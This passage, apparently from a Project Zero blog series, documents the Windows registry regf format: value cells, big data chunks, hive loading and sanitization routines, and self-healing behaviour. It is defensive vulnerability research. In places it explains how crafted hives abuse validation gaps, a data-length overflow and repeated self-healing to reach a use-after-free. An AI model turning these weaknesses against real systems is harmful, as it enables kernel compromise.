In general, values are much simpler than keys. To begin with, they are not a full-fledged object in the NT Object Manager sense: you cannot open a handle to a value, and thus you may only access them through the handle of its associated key and its name. They also don't have dedicated security descriptors, so a client with a key handle with the KEY\_QUERY\_VALUE access can enumerate and read all values of the key, and the KEY\_SET\_VALUE rights allows the caller to create/modify/delete all values within a key. For these reasons, values are best thought of as elaborate attributes of a key, not as an independent entity.

There is no fixed limit on the number of values associated with a key other than the available hive space, which places the number at around 67 million (0x80000000 ÷ 0x20, the hive space divided by the minimum value cell size). The value list format is also not as optimized as the subkey index is: it is a linear, single-level list with just the raw value cell indexes, without any additional metadata like a header or hints. The list is not sorted either, and their order is defined by when they were added to the key. Finally, value name uniqueness is guaranteed on output, but not enforced on input: it is possible to load a specially crafted hive with several values with the same name, and contrary to duplicate keys, this doesn't seem to pose any fundamental problems for the registry implementation.

A high-level overview of the hive cells related to a key's value list is shown below:

[![Diagram showing the high-level overview of the hive cells related to a key's value list](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-kkqHETa7hxjybGBjyP5n8vSsLqW5_62Y5wh6_0TumJfzZ02N3o3EJplOm34WUH2Aosppu38CHWJxaTZ4HWdpcivVAbr7Y60kmawVkTEQaZ47oRr3MuW-3TNhi_9EkySX5d8fBCQQvAGtQIkTpBgSFt8dMCaMKnAaZb160I1epSQtF7oJZeCXBwbLLnI/s1200/image2.png "Diagram showing the high-level overview of the hive cells related to a key's value list")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-kkqHETa7hxjybGBjyP5n8vSsLqW5_62Y5wh6_0TumJfzZ02N3o3EJplOm34WUH2Aosppu38CHWJxaTZ4HWdpcivVAbr7Y60kmawVkTEQaZ47oRr3MuW-3TNhi_9EkySX5d8fBCQQvAGtQIkTpBgSFt8dMCaMKnAaZb160I1epSQtF7oJZeCXBwbLLnI/s1999/image2.png)

In the next section, we will examine the internal layout and semantics of the \_CM\_KEY\_VALUE structure, which describes each unique value in the registry.

##### The key value cell

As usual, we can print out the structure definition in WinDbg:

0: kd> dt \_CM\_KEY\_VALUE

nt!\_CM\_KEY\_VALUE

   +0x000 Signature        : Uint2B

   +0x002 NameLength       : Uint2B

   +0x004 DataLength       : Uint4B

   +0x008 Data             : Uint4B

   +0x00c Type             : Uint4B

   +0x010 Flags            : Uint2B

   +0x012 Spare            : Uint2B

   +0x014 Name             : [1] Wchar

Let's examine each field more closely.

###### Signature

It identifies the cell as a key value, and must be equal to 0x6B76 ('vk'). It is verified during hive load, but isn't used for anything else later on.

###### NameLength and Name

The combination of these two fields specifies the name of the value: NameLength indicates the length of the string in bytes, and Name is an inline, variable-length buffer that stores the name itself. Let's consider the same criteria of the name that we have previously discussed in the context of registry keys:

* Compression: Similarly to keys, value names may be compressed if the VALUE\_COMP\_NAME (0x1) flag is set in \_CM\_KEY\_VALUE.Flags. In that case, the string is stored as 8-bit ASCII characters, otherwise the normal wide-character encoding is used.
* Length: The length of the name can be between 0 and [16,383](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits) characters. A length of zero indicates an alias for the value displayed by Regedit as "(Default)", a remnant of the design from Windows 3.1 where data was assigned directly to keys. As a sidenote, the correct enforcement of the upper limit was only introduced in October 2022 as a fix for [CVE-2022-37991](https://project-zero.issues.chromium.org/issues/42451478).
* Charset: All characters in the 0x0000 – 0xFFFF range are allowed in a value name, with no exceptions. Since values are not part of the same namespace as keys, this even includes backslashes. The only constraint is that if the corresponding key is a symbolic link, then the value must be named "SymbolicLinkValue", as it has a special meaning and stores the link's target path. An example of a bug related to sanitizing value names was [CVE-2024-26176](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/02_SymbolicLinkValue_OOB_read).
* Uniqueness: Value name uniqueness is not enforced on input, but it is maintained by the kernel at runtime on a best-effort basis. That means that whenever setting a value, the system will always try to reuse an existing one with the same name before creating a new one. Similarly to keys, value lookup is performed in a case-insensitive manner, but the original casing is preserved and visible to the clients.

###### DataLength

Specifies the length of the data stored in the value. The various ranges of the 32-bit space that the field can fall into are explained below:

| DataLength | Hive versions < 1.4 | Hive versions ≥ 1.4 |
| --- | --- | --- |
| 0x0 | Empty value, `Data` must be set to HCELL\_NIL. | |
| 0x1 – 0x3FD8 | Data stored directly in a backing cell pointed to by `Data`. | |
| 0x3FD9 – 0xFFFFC | Data stored directly in a backing cell pointed to by `Data`. | Data split into 16344-byte chunks and saved in a big data object pointed to by `Data`. |
| 0xFFFFD – 0x3FD7C028 | Invalid. |
| 0x3FD7C029 – 0x7FFFF000 | Not accepted on input due to a 16-bit integer overflow in [the](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/16_Registry_value_big_data_count_overflow) [big data chunk count](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/16_Registry_value_big_data_count_overflow). Feasible to set at runtime, but the saved data will be truncated due to the same bug / design limitation. |
| 0x7FFFF001 – 0x7FFFFFFF | Invalid | |
| 0x80000000 – 0x80000004 | Between 0–4 bytes stored inline in the `Data` field. | |
| 0x80000005 – 0xFFFFFFFF | Invalid. | |

###### Data

Responsible for storing or pointing to the data associated with the value. To summarize the table above, it can be in one or four states, depending on the data length and hive version:

1. Empty – equal to HCELL\_NIL, if DataLength is 0.
2. Inline – stores up to four bytes in the Data member of the value cell itself, as indicated by DataLength & 0x7FFFFFFF, if the highest bit of DataLength is set. As a side effect, an empty value can be represented in two ways: either as DataLength=0 or DataLength=0x80000000.
3. Raw data – points to a raw backing cell if Hive.Version < 1.4 or DataLength ≤ 0x3FD8.
4. Big data – points to a big data structure introduced in hive version 1.4, which is capable of storing 0xFFFF × 0x3FD8 = 0x3FD7C028 bytes (a little under 1 GiB). More on big data cells in the section below.

###### Type

This field is supposed to store one of the [supported value types](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types), such as REG\_DWORD, REG\_BINARY, etc. We'll omit a thorough discussion of the official types, as we feel they are already well documented and understood. From a strictly technical point of view, though, it's important to note that the type is simply a hint, an extra piece of metadata that is available to a registry client with the intended purpose of indicating the nature of the value. However, Windows provides no guarantees with regards to the consistency between the value type and its data. For instance, a REG\_DWORD value doesn't have to be four-bytes long (even though it conventionally is), a REG\_SZ unicode string can have an odd length, and so on. Any client application that operates on user-controlled data from the registry should always check the specific properties it relies on, instead of unconditionally trusting the value type.

Beyond this flexibility in data interpretation, there's another aspect of the Type field to consider: its potential for misuse due to its 32-bit width. The kernel generally doesn't perform any verification that its numerical value is one of the small, predefined enums (other than to ensure REG\_LINK for symbolic links and REG\_NONE for tombstone values), so it is possible to set it to any arbitrary 32-bit value, and have it returned in exactly the same form by system APIs such as [RegQueryValueEx](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexw). If a program or driver happens to use the value type returned by the system as a direct index into an array without any prior bounds checking, this could lead to out-of-bounds reads or memory corruption. In some sense, it would probably be safest for the most critical/privileged software in the system (e.g. antivirus engines) not to use the value type at all, or only within a very limited scope.

###### Flags

There are currently two supported flags that can be set on registry values:

* VALUE\_COMP\_NAME (0x1) – equivalent to KEY\_COMP\_NAME, indicates that the value name representation is a tightly packed string of ASCII characters.
* VALUE\_TOMBSTONE (0x2) – used exclusively in differencing hives (version 1.6) to indicate that a value with the given name has been explicitly deleted and doesn't exist on this key layer. It requires that the value type is REG\_NONE and it doesn't contain any data. It is equivalent to the Tombstone (1) property of a key set in the LayerSemantics field of a key node.

###### Spare

Unused member, never accessed by the kernel.

##### Big data value storage

Prior to hive version 1.4, the maximum length of a value in the registry was 1 MB, which was directly related to the maximum length of the single backing cell that would store the raw data. This limitation is documented in the [Registry element size limits](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits) article:

| Registry element | Size limit |
| --- | --- |
| Value | * Available memory (latest format) [editor's note: this is not fully accurate] * 1 MB (standard format) |

Here, "standard format" refers to regf v1.3. On some level, 1 MB could be considered a reasonable limit, as the registry was not designed to serve as storage for large quantities of data – at least not initially. One example of a public resource which vocalized this design decision was the old [Windows registry information for advanced users](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users) article from around 2002-2003, which stated:

| Long values (more than 2,048 bytes) must be stored as files with the file names stored in the registry. |
| --- |

Nevertheless, it seems that at some point during the development of Windows XP, Microsoft decided to provide the registry clients with the ability to store larger chunks of data, not bound by the somewhat arbitrary limits of the regf format. In order to facilitate this use case, a new cell type was added, called the "big data". Conceptually, it is simply a means of dividing one long data blob into smaller portions of 16344 bytes, each stored in a separate cell. It replaces the single backing cell with a \_CM\_BIG\_DATA structure defined as follows:

0: kd> dt \_CM\_BIG\_DATA

nt!\_CM\_BIG\_DATA

   +0x000 Signature        : Uint2B

   +0x002 Count            : Uint2B

   +0x004 List             : Uint4B

The signature is set to 0x6264 ('db') and verified on hive load, but otherwise not used. The count represents the number of 16344-byte chunks making up the overall value, and is generally supposed to be set to an integer between 2–65535. Otherwise, if it was set to 0, that would mean that the value is empty so the big data object shouldn't be present at all. If it was equal to 1, a direct backing buffer should have been used instead, so such a construct would also be invalid. Neither zero nor one are thus accepted by the hive loader, but it is technically possible to set these values at runtime by abusing the aforementioned [integer overflow bug](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/16_Registry_value_big_data_count_overflow). We haven't found any security impact of this behavior other than it being a correctness error, though.

The last element of the structure, List, is a cell index to a basic array of cell indexes making up the value chunks. Its format is equivalent to that of the value list, which also stores just the HCELL\_INDEX values without any headers or additional information. Furthermore, every chunk other than the last one must contain exactly 16344 bytes. If the length of the overall value is not divisible by 16344, the final chunk contains the remaining 1–16343 bytes. The layout of the big data object and its associated cells is shown in the diagram below:

[![The layout of the big data object and its associated cells](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6SwYri6hkJBoHs5op8qe6mhTYZeVJwH3JnfR3CexiLYMaOE4RbS6EXJNNzysF4f1gs3trpBnid1DTs2UqKIKGj08qppMdJ-eJ7duiFbeC1ASIBYP1PuMi3-XHPCJACC5i093_R141BIAnnXlhGusKX3IXYHgUFIyTuDggoE8oUTFxtFIcuRHde-aaFvM/s1200/image7.png "The layout of the big data object and its associated cells")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6SwYri6hkJBoHs5op8qe6mhTYZeVJwH3JnfR3CexiLYMaOE4RbS6EXJNNzysF4f1gs3trpBnid1DTs2UqKIKGj08qppMdJ-eJ7duiFbeC1ASIBYP1PuMi3-XHPCJACC5i093_R141BIAnnXlhGusKX3IXYHgUFIyTuDggoE8oUTFxtFIcuRHde-aaFvM/s1999/image7.png)

This concludes the part about the internal format of registry hives.

## The hive loading and sanitization process

The hive loading process implemented by the NtLoadKey\* family of system calls is a long and complex operation. It involves opening the hive file, loading it in memory, verifying its integrity, optionally recovering state from transactional log files, allocating any related kernel objects, attaching the hive to the global registry tree, and optionally opening a handle to the hive root and returning it to the caller. In this blog post, we are particularly interested in the hive sanitization part. Understanding this portion of the registry code is like consulting the official specification – or even better, as the code doesn't lie and is essentially the ground truth of what is and isn't accepted as valid data. Furthermore, it provides us with a number of hints as to which properties of the format are imperative to the correct functioning of the database, and which ones are more conventional, and don't have any serious consequences even if broken. The goal of this section is to discuss the overall control flow of loading a hive and performing the initial pass of sanitization. By documenting which internal routines are responsible for which checks, we hope to make it easier for other security researchers to navigate the hive loading code, providing a good starting point for their own investigations.

The registry, as a logical structure, is built on top of several lower-layer abstractions, each of which has a number of invariants that must hold in order for the hive to be considered valid, and in order for operations being performed on the hive to be safe. This is illustrated in the pyramid below, with the most foundational requirements placed at the bottom, and the increasingly more general aspects of hive integrity towards the top:

[![Diagram in the shape of a pyramid, with five levels. The base level showing the hive header, bin and cell layout consistency, and the top level showing Correctness of global hive properties, with all levels described below this image with examples ](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibUVk499wc-Yte1DVLfmcUQYhsQvy6ARBfLsri3Jiov3hZkY5WLsOqMoqkhMcBZkYJsLuKCaDm8eiamtml4qFL3FbrngHqpXVPwFhPXpwaDI5qYh9EHHIdJ0qc2XfCD6IFgOxIeHgsyKMWSuslXaajrOKuJ-GEnc-rzgQb0ohZKfOTAXHjfthXSEHlrCE/s5663/loading_pyramid.png "Diagram in the shape of a pyramid, with five levels. The base level showing the hive header, bin and cell layout consistency, and the top level showing Correctness of global hive properties, with all levels described below this image with examples ")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibUVk499wc-Yte1DVLfmcUQYhsQvy6ARBfLsri3Jiov3hZkY5WLsOqMoqkhMcBZkYJsLuKCaDm8eiamtml4qFL3FbrngHqpXVPwFhPXpwaDI5qYh9EHHIdJ0qc2XfCD6IFgOxIeHgsyKMWSuslXaajrOKuJ-GEnc-rzgQb0ohZKfOTAXHjfthXSEHlrCE/s5663/loading_pyramid.png)

Let's consider some examples of validity checks at each level, starting with the most fundamental ones:

1. Hive header, bin and cell layout consistency
   * Validity of the hive version, length, root cell index, flags in the header.
   * Existence of at least one bin in the hive.
   * Validity of each bin's header, particularly the file offset and size.
   * Validity of cells: aligned to eight bytes, within the bounds of the bin, completely filling out the bin.
2. Intra-cell consistency
   * Sufficient size of each cell with regards to the data it stores: at least the minimum size for the cell type (e.g. 0x4e for the key node), plus adequate to any variable-length internal arrays, such as the key name or value name.
   * Correct signatures being set for every kind of cell depending on its function.
   * Valid combinations of flags being set in key nodes and values.
   * Strings (key names, value names) adhering to the format requirements regarding minimum and maximum lengths, charset, etc.
3. Inter-cell consistency
   * Valid references to cells in cell indexes, and each allocated cell only being used for one specific purpose.
   * Consistency between copies of redundant data in separate cells: e.g. \_CM\_KEY\_NODE.SubKeyCounts[...] vs. the length of the subkey index.
   * Consistency between length markers in one cell vs. the amount of data stored in the corresponding backing buffer (e.g. \_CM\_KEY\_VALUE.DataLength vs. length of the data stored in the raw data cell / big data cell).
   * Correct hints in subkey indexes (fast leaves, hash leaves).
   * Correct reference counts in the security descriptors.
4. Structural correctness of high-level constructs
   * Consistency of the linked list of security descriptors.
   * Subkeys being laid out in a lexicographical order in all subkey indexes.
   * Symbolic link keys having a single value named "SymbolicLinkValue" of type REG\_LINK.
   * Subkeys in the stable space always having a non-volatile parent.
5. Correctness of global hive properties
   * Each hive always containing at least one key (the root key) and at least one security descriptor.
   * Only the root of the hive, and no other key having the KEY\_HIVE\_ENTRY flag set.
   * The depth of the hive's tree structure being a maximum of 512 levels.

As we can see, there are a variety of constraints that require verification when loading a hive, with the more abstract ones relying on the lower-layer ones to be confirmed first. It explains why the process is by far the most complex operation one can perform on the registry, spanning across thousands of lines of code and dozens of functions. To better illustrate this process, I've outlined the most important hive validation functions below, indented to show their hierarchical relationships as they execute in the kernel:

* NtLoadKey\* → CmLoadDifferencingKey → CmLoad(App)Key
  + CmpCmdHiveOpen → CmpInitHiveFromFile → CmpCreateHive
    - HvHiveStartFileBacked → HvLoadHive
      * HvpGetHiveHeader
      * HvAnalyzeLogFiles
      * HvpPerformLogFileRecovery
      * HvpRemapAndEnlistHiveBins
        + HvpValidateLoadedBin
        + HvpEnlistFreeCells
    - CmCheckRegistry
      * HvCheckHive
        + HvCheckBin
      * CmpValidateHiveSecurityDescriptors
      * CmpCheckRegistry2
        + CmpCheckKey
          - CmpCheckValueList
          - CmpCheckLeaf
        + CmpCheckLexicographicalOrder
        + CmpCheckAndFixSecurityCellsRefcount
  + CmpLoadKeyCommon
    - CmpLinkHiveToMaster
      * ObOpenObjectByName → ... <NT Object Manager> ... → CmpParseKey → CmpDoParseKey
        + CmpUpdateHiveRootCellFlags

Here is a short summary of each of the above functions, according to my own analysis and understanding:

| Function name(s) | Description |
| --- | --- |
| NtLoadKey\* | The four syscall entry points for loading registry hives, as discussed in the [previous post](https://googleprojectzero.blogspot.com/2024/10/the-windows-registry-adventure-4-hives.html): NtLoadKey, NtLoadKey2, NtLoadKeyEx, NtLoadKey3. |
| CmLoadDifferencingKey | A generic function for loading hives – not just differencing ones but every kind, contrary to what the name might suggest. Other than the syscall handlers, it is also called by VrpPreLoadKey and VrpLoadDifferencingHive, which are parts of the VRegDriver. It is responsible for sanitizing the input flags, checking the privileges of the caller, calling registry callbacks, invoking specialized functions to actually load the hive, and opening a handle to the root of the hive if the caller requested it. |
| CmLoadKey,CmLoadAppKey | Functions implementing the core functionality of loading normal and app hives, respectively. They are responsible for coordinating lower-layer loading functions, resolving any conflicts related to the hive file / registry mount path, and inserting the hive-related objects into the corresponding kernel data structures. In terms of opening and validating the binary hive representation, they are virtually equivalent. |
| CmpCmdHiveOpen,CmpInitHiveFromFile,CmpCreateHive | Functions dedicated to opening the hive file on disk, loading it in memory, validating its integrity and allocating the internal kernel structures (\_CMHIVE and other objects representing the hive). |
| HvHiveStartFileBacked,HvLoadHive | Common functions for loading and sanitizing the hive on the level of header, bins and cells (the lowest level of the pyramid). |
| HvpGetHiveHeader | Reads and validates the hive header, trying to determine if it is valid or corrupted, and whether the header or hive data need to be recovered from a log file. |
| HvAnalyzeLogFiles,HvpPerformLogFileRecovery | Two most important functions related to data recovery from log files: the first one determines which of the two files (.LOG1/LOG2) to use, and the second one actually applies the log file entries to the hive mapping in memory. |
| HvpRemapAndEnlistHiveBins,HvpValidateLoadedBin,HvpEnlistFreeCells | Functions responsible for re-mapping the hive after log file recovery, in order to ensure that every bin is mapped as a continuous block of memory. During the process, the validity of all bins and the layout of their cells is verified. |
| CmCheckRegistry | A generic function encompassing the verification of levels ≥ 2 of the pyramid, i.e. everything about the hive that defines its logical structure and is not related to memory management. If any self-healing occurs during the process, the function restarts its logic, so it may potentially take multiple iterations before a corrupted hive is fixed up and accepted as valid. |
| HvCheckHive,HvCheckBin | Two functions responsible for validating the bin headers and layout of their cells. As you may have noticed, this part of their functionality is redundant with HvpValidateLoadedBin and HvpEnlistFreeCells. The difference is that the earlier functions are used to cache information about the positions of free cells in the hive, to optimize the allocation process later on. On the other hand, the underlying purpose of HvCheckHive and HvCheckBin is to generate a bitmap object (RTL\_BITMAP) that indicates the positions of allocated cells, in order to ensure the validity of cell indexes when sanitizing the hive, and to make sure that every cell is only used for a single purpose in the hive.  As a side note, there is an [amusing bug](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/18_HvCheckBin_incorrect_return_value) in HvCheckBin related to verifying cell size correctness, but it seems to be non-exploitable precisely because the same sanitization is correctly performed earlier in HvpEnlistFreeCells. |
| CmpValidateHiveSecurityDescriptors | The function traverses the linked list of security descriptor cells, and verifies its consistency (the correctness of the Flink/Blink indexes) and the validity of the security descriptor blobs. At the same time, it also caches information about the descriptors in internal kernel structures, so that they can be quickly looked up when verifying the \_CM\_KEY\_NODE.Security fields, and later at system run time. |
| CmpCheckRegistry2 | A function responsible for performing a single attempt at validating the entire key structure. There are several possible return codes:   * STATUS\_SUCCESS if the hive validation passes without problems, * STATUS\_REGISTRY\_HIVE\_RECOVERED if minor corruption was encountered, but it was successfully fixed in-place, * STATUS\_RETRY if a badly corrupted key was encountered and removed from its parent's subkey index. This causes CmCheckRegistry to restart the validation process from scratch. * STATUS\_REGISTRY\_CORRUPT if the hive was found to be corrupted beyond repair. * Other problem-specific error codes such as STATUS\_NO\_LOG\_SPACE or STATUS\_INSUFFICIENT\_RESOURCES, which cause the loading process to be aborted. |
| CmpCheckKey | This is the central function in the hive sanitization process, with more than a thousand lines of code in decompiled output, and likely just as many in the original source code. It essentially checks the validity of all fields within a specific key node, and also orchestrates the validation of the value list and subkey index associated with the key. If there was one function I would recommend analyzing to better understand the regf format, it would be this one. |
| CmpCheckValueList | Checks the consistency of a value list, each of the value cells on the list, and their backing buffers / big data objects. |
| CmpCheckLeaf | Validates a specific leaf subkey index, i.e. one of 'li', 'lf', 'lh'. This includes checking the cell size, signature, validity of the subkey cell indexes and their hint values. |
| CmpCheckLexicographicalOrder | Compares the name of two consecutive subkeys to determine if the second one is lexicographically greater than the first, in order to ensure the right sorting of a subkey index. |
| CmpCheckAndFixSecurityCellsRefcount | Iterates over all security descriptors in the hive, compares their refcounts loaded from disk with the values independently re-calculated while sanitizing the key tree, and corrects them if they are unequal. Since November 2024, it also frees any unused security descriptors with the reference count set to zero (they had been previously allowed, as described in [WinRegLowSeverityBugs issue #10](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/10_CmpKeySecurityIncrementReferenceCount_zero_refcount_crash)). |
| CmpUpdateHiveRootCellFlags | The function makes sure that the root key of the hive has the KEY\_NO\_DELETE and KEY\_HIVE\_ENTRY flags set. Interestingly, these flags are the only aspect of the regf format that is not enforced directly while loading the hive (in CmpCheckKey), but only at a later stage when the hive is being mounted in the global registry view. |

### Self-healing properties

The Windows implementation of the registry has the unique property that it is self-healing: the system tries very hard to successfully load a hive even if it's partially corrupted. My guess is that the reason for this design was to make the mechanism resilient against random data corruption on disk, as failure to load a system hive early during start-up would make Windows unusable. Perhaps it was decided that it was a better tradeoff to forcefully remove the broken parts of the file, with the hope that they would be automatically re-created later at run time, or that they weren't very important to begin with and the system/applications could continue to function correctly without them. And even if not, giving the user a chance to troubleshoot the problem or recover their data would still be a better outcome than bricking the machine completely.

Consequently, whenever an error is detected by the hive loading logic, it is handled in one of several ways, depending on the nature of the problem:

* Bin recreation: if HvpValidateLoadedBin indicates that any part of a bin header is corrupted, then HvpRemapAndEnlistHiveBins re-initializes it from scratch, and declares it as 4096 bytes long (regardless of the previous length).
* Cell recreation: if HvpEnlistFreeCells detects a cell with an invalid length, it converts it to a single free cell spanning from the current offset until the end of the bin, potentially erasing any other data/cells previously residing in that region.
* Small, direct fix: if a single field within a key node is found to have an invalid state, and the good/expected state is known to the kernel, the problem gets fixed by directly overwriting the old value with the correct one. Examples include cell signatures and mandatory/illegal flags.
* Single value deletion: if any inconsistencies are found in a value cell or its associated data cell(s), the specific value is removed from the key's value list.
* Deletion of entire value list: if the descriptor of a value list (i.e. its cell index or length) are invalid, or if a symbolic link contains more than one value, the entire value list of the key is cleared.
* Single key deletion: if an irrecoverable problem is found within a key node (e.g. invalid cell index, invalid cell length, invalid name), then it is removed from its parent's subkey index, and the key tree validation process is restarted from scratch.
* Deletion of entire subkey index: if any irrecoverable problem is found in a subkey index, it is deleted, and the subkey list of its associated key is cleared.
* Security descriptor list reset: if any errors are detected in the list of security descriptors (bad Flink/Blink indexes or invalid binary format), the set of descriptors in the hive is reduced to the single root descriptor, which will then be inherited by all the keys in the hive.
* Rejection of entire hive: if any issues are found with the fundamental parts of the regf format or its properties (heavily corrupted header, missing bins, invalid root key, invalid root security descriptor), the loading of the hive is completely aborted.

As we can see, Windows implements a very defensive strategy and always attempts to either fix the corrupted data, or isolate the damage by deleting the affected object while preserving the overall hive integrity. Only when these repair attempts are exhausted does the kernel abort the loading process and return an error. This resilience can lead to situations where a freshly loaded hive is already in a "dirty" state, requiring the system to immediately flush its self-applied corrections to disk to maintain consistency.

One particularly interesting bug related to the self-healing process was [CVE-2023-38139](https://project-zero.issues.chromium.org/issues/42451601). To reproduce the issue, the self-healing logic would have to be triggered a large number of times (in the case of my PoC, 65535 times) in order to cause a 32-bit integer overflow of a security descriptor refcount, and later a UAF condition. I have also abused the behavior to demonstrate [WinRegLowSeverityBugs #13](https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion), in which a key with an empty name would be removed during load, freeing up a reference to a security descriptor and resulting in the refcount being equal to zero upon loading. Overall, the self-healing property of the registry is not the most critical, but one that I find quite fascinating and certainly worth keeping in mind as part of one's toolbox when researching this subsystem.

## Conclusion

Congratulations on reaching the end! This post aimed to systematically explore the inner workings of the regf format, focusing on the hard requirements enforced by Windows. Due to my role and interests, I looked at the format from a strictly security-oriented angle rather than digital forensics, which is the context in which registry hives are typically considered. Hopefully, this deep dive clarifies some of the intricacies of the hive format and complements existing unofficial documentation.

Keep in mind that hives store their data in the regf files on disk, but Windows also creates multiple auxiliary kernel objects for managing and caching this data once loaded. The next post in the series will discuss these various objects, their relationships, lifecycle, and, naturally, their impact on system security. Stay tuned!

Posted by

[Google Project Zero](https://www.blogger.com/profile/08975904405228580347 "author profile")

at

[11:03 AM](https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html "permanent link")

[No comments:](https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=5470414558693895520&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5470414558693895520&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5470414558693895520&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5470414558693895520&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5470414558693895520&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=5470414558693895520&target=pinterest "Share to Pinterest")

[Older Posts](https://googleprojectzero.blogspot.com/search?updated-max=2024-12-19T11:03:00-08:00&max-results=1 "Older Posts")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://googleprojectzero.blogspot.com/feeds/posts/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ▼
  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ▼
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
    - [The Windows Registry Adventure #5: The regf file f...](https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html)
    - [The Qualcomm DSP Driver - Unexpectedly Excavating ...](https://googleprojectzero.blogspot.com/2024/12/qualcomm-dsp-driver-unexpectedly-excavating-exploit.html)
    - [Windows Tooling Updates: OleView.NET](https://googleprojectzero.blogspot.com/2024/12/windows-tooling-updates-oleviewnet.html)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ►
  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
  + ►
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
